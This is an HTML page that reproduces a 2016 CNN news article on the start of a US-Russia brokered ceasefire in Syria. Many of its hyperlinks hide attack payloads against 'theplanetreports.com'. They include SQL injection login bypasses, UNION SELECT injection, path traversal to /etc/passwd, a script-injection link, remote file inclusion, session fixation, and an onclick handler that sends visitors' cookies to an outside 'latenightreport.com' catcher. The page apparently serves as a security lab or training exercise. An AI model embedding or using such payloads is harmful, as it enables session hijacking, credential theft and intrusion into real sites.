<h2>Syria: Temporary ceasefire begins amid skepticism</h2>

<p class="details">By Tim Hume and Holly Yan ,September13, 2016  <a href="#"></a> </p>



<p>

Hours after a <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%
271&submit=Login" target="_blank"> ceasefire started </a> in Syria on Monday, the world waited to see how long the fragile peace would last.
</p><p>
The deal, brokered by the United States and Russia, calls for a <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#"> halt to the violence between </a> the Syrian regime and rebel forces. It would also allow for much-needed humanitarian access to besieged cities such as Aleppo.
</p> <p>
US Secretary of State John Kerry said while the start of the ceasefire looked good, "it is far too early to draw any definitive conclusions."
</p>
<p><img class="alignright" src="/images/syriaceasefire.png" width="350" height="350" alt="Syriaceasefire" /></p>


<p>
But just hours before the ceasefire started, Syrian President Bashar al-Assad gave a <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank"> defiant message to the country's opposition forces.</a>
"We have come here to give the message that the Syrian nation is determined to retake every piece of land from the terrorists, and to re-establish safety and security, to reconstruct and rebuild infrastructure and rebuild everything that has been destroyed," he said in footage broadcast by the state-run <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank"> Syrian Arab News Agency.</a>
</p> <p>
"I think this message needs to be directed ... to those who bet against Syria in the first days, weeks and months of the crisis and until today," he said.</p> <p>
He said his message was especially targeted at those who have <a href="http://www.theplanetreports.com/uploads/traversal_main.php?data=cat%20/etc/passwd" target="_blank" >"supported the terrorists."</a></p> <p>
Assad's family has ruled Syria for 45 years. He has often referred to opposition members seeking his ouster as terrorists.</p> <p>
The Aleppo Media Center said it knows of five attacks that happened after the agreed upon deadline of sunset Monday for a reduction of violence. They are:
</p> <p>

• Syrian helicopters shelled the areas of Handarat, al Breij and al Shiqaifa with sea mines, which have a higher destructive ability than barrel bombs.
•The town of Kafr Da'el was hit with rockets from Syrian jets.
• The main road that connects Aleppo with Daret Ezza received<a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank"> heavy gunfire from Syrian jets.</a>
• Al Mansoura was targeted with heavy gunfire by Syrian jets
• Masaken Hanano neighborhood of Aleppo was shelled by Syrian tank artillery.
CNN could not confirm any of these incidents.
</p> <p>
<b>
Kerry: 'This is less than perfect'</b>

After previous ceasefire attempts failed, Kerry addressed <a href="http://www.theplanetreports.com/index.php?name=Visitor%3Cscript%3Ealert(%27You%20are%20being%20attacked.%27)%3C/script%3E" target="_blank"> criticism that the latest deal is flawed.</a>
"Sure, this is less than perfect," he said Monday. "But flawed compared to what? Compared to nothing?"
Kerry said the carnage and devastation in Syria before the deal was "worse than flawed," and that the international deal "may be the last chance we have to save a united Syria."
"This catastrophe developed step by step, folks, and it can only be reversed step by step," he said. "This is the best thing we could think of."
</p> <p>
<b>
Dire needs </b></p><p>
The ceasefire gives an opportunity to provide much-needed <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank"> humanitarian relief </a> for hundreds of thousands of Syrians.</p> <p>

"We are ready to get assistance into Aleppo right away," said Dominic Graham, Syria response director for international aid agency Mercy Corps.
"We have food rations packed and ready to go, but we must be certain the <a href="http://www.theplanetreports.com/buy.php?item=Monthly&PHPSESSID=jeoefgfi6b16h7l213jh30k2q1+&quantity=400" target="_blank"> ceasefire is holding</a> with all parties before sending people and trucks into harm's way."</p> <p>

The United States and Russia previously coordinated a partial ceasefire in February. But human rights groups monitoring the situation reported several airstrikes in the Aleppo region and near Raqqa, ISIS' de facto capital, just days after the truce took effect.
</p> <p>
<b>Cities in ruins</b></p>
<p>

The Syrian president made his defiant remarks Monday during a symbolic visit to the former <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">rebel stronghold of Daraya, </a> a now-devastated Damascus suburb.
</p> <p>
Daraya was under siege by the regime for years until a recent evacuation deal that allowed thousands of civilians and hundreds of rebel militants to leave the city, marking a major victory for Assad.</p> <p>
In June, activists said the Syrian regime pounded the area with barrel bombs just hours after food was delivered to the besieged suburb for the first time in nearly four years.</p> <p>
Fear also permeates Aleppo, Syria's once-bustling cultural and economic center that has been largely reduced to rubble.
An activist from the Aleppo Media Center -- an opposition-affiliated activist group -- told CNN that he read Assad's presence in a formerly opposition-held area as a sign to "that this could be our fate someday."</p> <p>
<b>
Pessimism over ceasefire prospects</b></p> <p>
Just hours before the ceasefire, airstrikes continued to bombard opposition targets.
At least seven people, including three children, were killed in rebel-held eastern Aleppo on Monday, according to UK-based monitoring group the Syrian Observatory for Human Rights.</p> <p>
The latest assault followed the deaths of 93 people in airstrikes in <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">  Aleppo and Idlib over the weekend </a>-- 61 of them in an attack on a popular market where residents were shopping ahead of the Eid al-Adha holiday.</p> <p>

Upticks in violence also have occurred before previous ceasefire attempts.
"We are not optimistic about this ceasefire," an activist for the Aleppo Media Center told CNN as explosions rang out in the background.
